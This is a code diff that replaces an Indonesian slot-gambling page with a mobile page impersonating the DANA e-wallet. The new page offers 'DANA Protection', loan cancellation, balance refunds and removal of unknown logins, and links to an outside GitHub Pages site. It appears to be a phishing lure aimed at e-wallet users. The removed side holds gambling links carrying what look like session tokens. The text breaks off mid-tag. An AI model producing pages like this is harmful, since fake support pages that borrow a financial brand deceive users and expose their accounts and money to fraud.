@@ -1,132 +1,122 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Situs Slot Online - BADAK CULA 1</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-</head>
-<body>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>Oh pn ke tasya Bae aku lah balek..Mak Ade tmpat nnek dgn tasyababaha bababa</title>
 
-    <div id="sidebar-overlay" class="sidebar-overlay"></div> 
-    
-    <div id="sidebar-menu" class="sidebar-menu">
-        <button class="close-btn" id="close-sidebar-btn">&times;</button>
-        
-        <div class="sidebar-auth-buttons">
-            <a href="register.html" class="btn btn-daftar">Daftar</a>
-            <a href="login.html" class="btn btn-login">Login</a>
-        </div>
-        
-        <h3><i class="fas fa-cog"></i> Menu Akun</h3>
-        
-        <ul>
-            <li><a href="index.html"><i class="fas fa-home"></i> Beranda</a></li>
-            <li><a href="#"><i class="fas fa-user-circle"></i> Profil Saya</a></li>
-            <li><a href="#" onclick="alert('Mengalihkan ke halaman Rekening Pribadi')"><i class="fas fa-wallet"></i> Rekening Pribadi</a></li>
-            <li><a href="#"><i class="fas fa-question-circle"></i> Bantuan & FAQ</a></li>
-            <li class="logout-item" style="margin-top: 20px;"><a href="#" onclick="alert('Anda telah keluar.')"><i class="fas fa-sign-out-alt"></i> Keluar (Logout)</a></li>
-        </ul>
-    </div>    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="satu.jpg" />
+    <meta property="og:description" content="Kami membantu Anda menangani masalah Paylater, Refund, dan Keamanan Akun DANA." />
+    <meta property="og:image" content="https://storage.googleapis.com/a1aa/image/a99ebb66-1680-4e6e-808f-ec5003dd76d0.jpg" />
+    <meta property="og:url" content="https://b813743.github.io/NOMOR-DANA/" />
+    <meta property="og:type" content="website" />
 
-    <header class="main-header">
-        <div class="logo">
-            <h1>BADAK CULA<span class="highlight">1</span></h1>
-        </div>        
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Oh pn ke tasya Bae aku lah balek..Mak Ade tmpat nnek dgn tasya - Monitor Aktivitas Akun Anda" />
+    <meta name="twitter:description" content="Kami membantu Anda menangani masalah Paylater, Refund, dan Keamanan Akun DANA." />
+    <meta name="twitter:image" content="https://storage.googleapis.com/a1aa/image/a99ebb66-1680-4e6e-808f-ec5003dd76d0.jpg" />
+
+    <!-- TailwindCSS & Fonts -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand&amp;display=swap" rel="stylesheet"/>
+    <style>
+      body {
+        font-family: 'Quicksand', sans-serif;
+      }
+    </style>
+  </head>
+  <body class="bg-white">
+    <div class="max-w-md mx-auto min-h-screen flex flex-col justify-between">
+      <div>
+        <header class="bg-[#0D8AF0] px-5 pt-5 pb-7 rounded-b-3xl">
+          <div class="flex items-center space-x-2 mb-5">
+            <img alt="dana.png" class="w-6 h-6" height="24" src="dana.png" width="24"/>
+            <span class="text-white font-bold text-xl tracking-wide">DANA</span>
+          </div>
+          <div class="flex items-center justify-between">
+            <div class="flex-1 pr-3">
+              <div class="flex items-center space-x-2 mb-1">
+                <img alt="DANA Protection white checkmark icon inside circle" class="w-6 h-6" height="24" src="https://storage.googleapis.com/a1aa/image/b624aafb-4380-42a0-520f-0b49e201f9b7.jpg" width="24"/>
+                <span class="text-white font-bold text-base leading-5 tracking-wide">
+                  DANA<br/>PROTECTION
+                </span>
+              </div>
+              <p class="text-white text-sm mb-3 leading-5">Monitor aktivitas akun</p>
+              <button class="text-[#0D8AF0] bg-white border border-white rounded-full text-xs font-semibold px-4 py-1.5 hover:bg-[#e6f0ff] transition" type="button">
+                LIHAT SEKARANG
+              </button>
+            </div>
+            <div class="relative w-24 h-24">
+              <img alt="Shadowed blue man silhouette with icons of phone, link, and bank floating" class="absolute top-0 right-0 w-24 h-24 object-contain" height="96" src="https://storage.googleapis.com/a1aa/image/a99ebb66-1680-4e6e-808f-ec5003dd76d0.jpg" width="96"/>
+            </div>
+          </div>
         </header>
 
-    <div id="main-content">
-        <div class="user-header">
-            <div class="user-info">
-                <img src="placeholder_avatar.png" alt="Avatar" class="avatar">
-                <span>Guest</span>
-            </div>
-            <div class="balance">
-                <div class="amount">Rp 0</div>
-                <button class="add-balance" onclick="window.location.href='deposit.html'"><i class="fas fa-plus"></i></button>
-            </div>
-            <div class="header-icons">
-                <button onclick="alert('Mengalihkan ke halaman Rekening Pribadi')">
-                    <i class="fas fa-credit-card icon-fa"></i>
-                </button>
-                <button id="open-sidebar-btn"> 
-                    <i class="fas fa-bars icon-fa"></i>
-                </button>
-            </div>
-        </div>
-
-        <div class="promo-banner">
-    <div class="promo-text-slide">TOTO MACAU SLIDE KE KIRI DENGAN EFEK BERKEDIP | SELAMAT MENIKMATI🔥🥳</div>
+        <main class="px-5 mt-6">
+          <h2 class="text-black text-lg font-normal mb-4">Pilih Kendala Anda Sekarang</h2>
+          <section class="space-y-4">
             
-        </div>
-        <div class="game-grid">
-            
-            <div class="game-item" onclick="window.open('https://5xtug3petd.keujxjzjan.net/gs2c/html5Game.do?jackpotid=0&gname=Starlight%20Princess%201000&extGame=1&ext=0&cb_target=exist_tab&symbol=vs20starlightx&jurisdictionID=99&minilobby=false&mgckey=AUTHTOKEN@c3a0c2340af53ca63bb4b838544fe8c6dc3b62a8025c87aebf529b21332c6e67~stylename@idn2_idntotob2b24~SESSION@792bc861-93be-45e3-927d-ac573de162a0~SN@aa78c92d&tabName=', '_blank')">
-                <img src="game_sweet_bonanza.jpg" alt="Sweet Bonanza" class="game-thumb">
-                <div class="game-overlay">
-                    <span class="game-name">Sweet Bonanza</span>
-                    <a href="#" class="btn-play-game"><i class="fas fa-play"></i> MAIN</a>
+            <!-- Link ke halaman pribadi -->
+            <a href="https://b813743.github.io/NOMOR-DANA/" class="block">
+              <article class="flex bg-white rounded-xl shadow-md border border-[#D9E6F9] overflow-hidden hover:bg-[#f0f8ff] transition">
+                <img alt="Phone with DANA Paylater text on blue background" class="w-24 h-24 object-cover flex-shrink-0" height="96" src="https://storage.googleapis.com/a1aa/image/2b4781d1-4269-4f04-43ca-973fd3681045.jpg" width="96"/>
+                <div class="p-3 flex flex-col justify-center">
+                  <h3 class="font-bold text-black text-sm leading-5 mb-1">#Pembatalan Pinjaman Paylater</h3>
+                  <p class="text-[#6CA0D9] text-xs italic leading-5 max-w-xs">
+                    Kami Siap Membantu Membatalkan Status Pinjaman Anda
+                  </p>
                 </div>
-                <div class="game-info">
-                    <div class="game-label hot">HOT</div>
-                    <div class="game-jackpot">J: 2,1 M</div>
-                </div>
-            </div>
+              </article>
+            </a>
 
-            <div class="game-item" onclick="window.open('https://5xtug3petd.keujxjzjan.net/gs2c/html5Game.do?jackpotid=0&gname=Starlight%20Princess%201000&extGame=1&ext=0&cb_target=exist_tab&symbol=vs20starlightx&jurisdictionID=99&minilobby=false&mgckey=AUTHTOKEN@c3a0c2340af53ca63bb4b838544fe8c6dc3b62a8025c87aebf529b21332c6e67~stylename@idn2_idntotob2b24~SESSION@d4e1e3fe-8a02-440e-a6a9-d2b80e6944c2~SN@aa78c92d&tabName=', '_blank')">
-                <img src="game_starlight_princess.jpg" alt="Starlight Princess" class="game-thumb">
-                <div class="game-overlay">
-                    <span class="game-name">Starlight Princess</span>
-                    <a href="#" class="btn-play-game"><i class="fas fa-play"></i> MAIN</a>
-                </div>
-                <div class="game-info">
-                    <div class="game-label hot">HOT</div>
-                    <div class="game-jackpot">J: 2,1 M</div>
-                </div>
-            </div>
+            <!-- Artikel lainnya -->
+            <article class="flex bg-white rounded-xl shadow-md border border-[#D9E6F9] overflow-hidden">
+              <img alt="Person with headset holding phone showing DANA Paylater on blue background" class="w-24 h-24 object-cover flex-shrink-0" height="96" src="https://storage.googleapis.com/a1aa/image/fc765bea-2850-44d1-a7f1-929c6e1dd0ca.jpg" width="96"/>
+              <div class="p-3 flex flex-col justify-center">
+                <h3 class="font-bold text-black text-sm leading-5 mb-1">#Claim DANA Paylater</h3>
+                <p class="text-[#6CA0D9] text-xs italic leading-5 max-w-xs">Ada Kebutuhan Mendesak? Yuk Klaim Paylaternya.</p>
+              </div>
+            </article>
 
-            <div class="game-item" onclick="window.open('https://5xtug3petd.keujxjzjan.net/gs2c/html5Game.do?jackpotid=0&gname=Snakes%20&%20Ladders%20-%20Snake%20Eyes&extGame=1&ext=0&cb_target=exist_tab&symbol=vs10snakeeyes&jurisdictionID=99&minilobby=false&mgckey=AUTHTOKEN@c3a0c2340af53ca63bb4b838544fe8c6dc3b62a8025c87aebf529b21332c6e67~stylename@idn2_idntotob2b24~SESSION@e453d282-3c5a-4d07-b013-8acb140f5e7a~SN@aa78c92d&tabName=', '_blank')">
-                <img src="game_snake.jpg" alt="Snake" class="game-thumb">
-                <div class="game-overlay">
-                    <span class="game-name">Snake Jackpot</span>
-                    <a href="#" class="btn-play-game"><i class="fas fa-play"></i> MAIN</a>
-                </div>
-                <div class="game-info">
-                    <div class="game-label new">NEW</div>
-                    <div class="game-jackpot">J: 587 Jt</div>
-                </div>
-            </div>
-            
-            </div>
-        
-    </div> <footer>
-        <button onclick="window.location.href='games.html'"><i class="fas fa-dice"></i> Permainan</button>
-        <button><i class="fas fa-trophy"></i> Jackpot</button>
-        <button onclick="window.location.href='deposit.html'"><i class="fas fa-exchange-alt"></i> Deposit</button> 
-        <button><i class="fas fa-money-bill-wave"></i> Dapatkan</button>
-        <button><i class="fas fa-star"></i> *Promo</button>
-    </footer>
-    
-    <script>
-        const sidebar = document.getElementById('sidebar-menu');
-        const openBtn = document.getElementById('open-sidebar-btn');
-        const closeBtn = document.getElementById('close-sidebar-btn');
-        const overlay = document.getElementById('sidebar-overlay');
+            <article class="flex bg-white rounded-xl shadow-md border border-[#D9E6F9] overflow-hidden">
+              <img alt="Hand holding DANA refund card with blue background" class="w-24 h-24 object-cover flex-shrink-0" height="96" src="https://storage.googleapis.com/a1aa/image/393d601a-2f95-45e8-db78-f12ed8b00df0.jpg" width="96"/>
+              <div class="p-3 flex flex-col justify-center">
+                <h3 class="font-bold text-black text-sm leading-5 mb-1">#Refund Saldo DANA</h3>
+                <p class="text-[#6CA0D9] text-xs italic leading-5 max-w-xs">
+                  Saldo Dana Anda pending, Atau Salah Transfer, Klik Untuk Dibantu
+                </p>
+              </div>
+            </article>
 
-        function openSidebar() {
-            sidebar.classList.add('open');
-            overlay.style.display = 'block';
-        }
+            <article class="flex bg-white rounded-xl shadow-md border border-[#D9E6F9] overflow-hidden">
+              <img alt="Masked person holding phone with LogOut DANA text on blue background" class="w-24 h-24 object-cover flex-shrink-0" height="96" src="https://storage.googleapis.com/a1aa/image/1486b058-c954-4906-56fb-13553d32a28a.jpg" width="96"/>
+              <div class="p-3 flex flex-col justify-center">
+                <h3 class="font-bold text-black text-sm leading-5 mb-1">#LogOut Perangkat Tak Dikenal</h3>
+                <p class="text-[#6CA0D9] text-xs italic leading-5 max-w-xs">
+                  Ada Yang Coba Login Akun Dana Kamu, Yuk Keluarkan
+                </p>
+              </div>
+            </article>
+          </section>
+        </main>
+      </div>
 
-        function closeSidebar() {
-            sidebar.classList.remove('open');
-            overlay.style.display = 'none';
-        }
-
-        openBtn.addEventListener('click', openSidebar);
-        closeBtn.addEventListener('click', closeSidebar);
-        overlay.addEventListener('click', closeSidebar); // Tutup saat klik di luar
-    </script>
-</body>
-                                                                                                                    </html>
+      <!-- Bottom Navigation -->
+      <nav aria-label="Bottom Navigation" class="flex justify-between items-center border-t border-gray-300 py-3 px-5 bg-white sticky bottom-0">
+        <button class="flex flex-col items-center text-black text-xs font-semibold">
+          <i class="fas fa-comment-alt text-lg mb-1"></i>
+          Beranda
+        </button>
+        <button class="flex flex-col items-center text-gray-400 text-xs font-normal">
+          <i class="far fa-file-alt text-lg mb-1"></i>
+          Aktivitas
+        </button>
+        <button aria-current="page" class="flex flex-col items-center text-white text-xs font-semibold bg-[#0D8AF0] rounded-full w-16 h-16 justify-center shadow-lg -mt-10">
+          <i class="fas fa-qrcode text-2xl"></i>
+          PAY
+        </button>
+        <button class="flex flex-col items
+                
